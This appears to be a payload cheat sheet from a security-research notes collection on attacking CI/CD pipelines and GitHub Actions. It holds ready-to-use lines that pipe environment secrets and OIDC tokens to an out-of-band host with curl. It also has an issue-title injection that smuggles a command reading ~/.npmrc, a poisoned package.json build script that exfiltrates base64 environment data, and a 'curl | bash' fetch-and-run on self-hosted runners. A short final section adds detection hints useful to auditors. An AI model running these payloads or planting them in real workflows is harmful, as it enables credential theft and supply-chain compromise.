---
title: "Payloads: CI/CD Pipeline Attacks"
type: payloads
tags: [payloads, cicd, github-actions, supply-chain]
sources: []
date_created: 2026-06-17
date_updated: 2026-11-11
---

# Payloads: CI/CD Pipeline Attacks

GitHub Actions and pipeline abuse. Routed via the `hunt-cicd` skill. See [[cicd-github-actions]].

## Pwn request (pull_request_target checks out untrusted fork code with secrets in scope)
```yaml
# VULNERABLE workflow an attacker targets
on:
  pull_request_target:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:                                   # checks out the attacker's fork HEAD...
          ref: ${{ github.event.pull_request.head.ref }}
          repository: ${{ github.event.pull_request.head.repo.full_name }}
      - run: make build                          # ...then runs it WITH base-repo secrets
```
```bash
# attacker payload placed in the forked PR (e.g. a build script the workflow runs)
env | grep -iE 'token|secret|aws|key' | curl -X POST --data-binary @- https://<oob>/x
# steal the OIDC token used for cloud/npm publish from runner env
echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN $ACTIONS_ID_TOKEN_REQUEST_URL" | curl -d @- https://<oob>/o
```

## Script injection (untrusted ${{ github.event.* }} interpolated into a shell run)
```yaml
- run: echo "${{ github.event.issue.title }}"   # title = a"; curl https://<oob>/$(cat ~/.npmrc); #
```

## Poisoned Pipeline Execution (PPE) without touching .github/workflows (bypasses CODEOWNERS)
```bash
# modify a file the pipeline already executes: Makefile / package.json scripts / build.gradle
# package.json:  "scripts": { "build": "node build.js; curl https://<oob>/$(env|base64)" }
```

## Self-hosted runner takeover (non-ephemeral = persistence + cross-repo)
```yaml
on: pull_request
jobs:
  x:
    runs-on: [self-hosted]                       # land on the shared runner host
    steps:
      - run: curl -k https://<attacker>/exec.sh | bash   # persists between jobs on non-ephemeral runners
```

## Cache poisoning across the fork/base trust boundary
```bash
# a fork-triggered job writes a poisoned actions/cache entry that a later trusted base job restores,
# injecting a tampered dependency/binary into the trusted build (see @tanstack 2025 npm chain).
```

## NEW 2025-2026

1. **GhostAction campaign (Sept 2025 -> Oct 2026 escalation)**: stolen maintainer
   PATs (pyxel, athenadriver authors) inject malicious Actions workflows disguised
   as "security audits" into 500+ repos; exfil CI secrets, cloud creds, AI API keys,
   git history over plain HTTP. Detection on any repo you audit: workflow files
   tagged audit/security you cannot map to an owner, HTTP (not HTTPS) exfil URLs,
   new workflows from dormant maintainer accounts.
2. **Workflow-injection grammar**: untrusted context (`github.event.*.title`,
   branch names, PR bodies) interpolated into `run:` blocks = RCE in the runner;
   `pull_request_target` + explicit checkout of PR head = secret exposure to PR
   code (tj-actions CVE-2025-30066 class).
3. **GITHUB_TOKEN over-scope**: default `write` permissions + `permissions:` never
   set = a single injection yields release/package publish; check
   `.github/workflows/*.yml` for missing `permissions:` blocks first.
4. **Persistence after a runner hit**: cache/artifact poisoning (poisoned action
   cache re-used by later jobs), self-hosted runner file persistence, branch-
   protection tampering via over-scoped token.
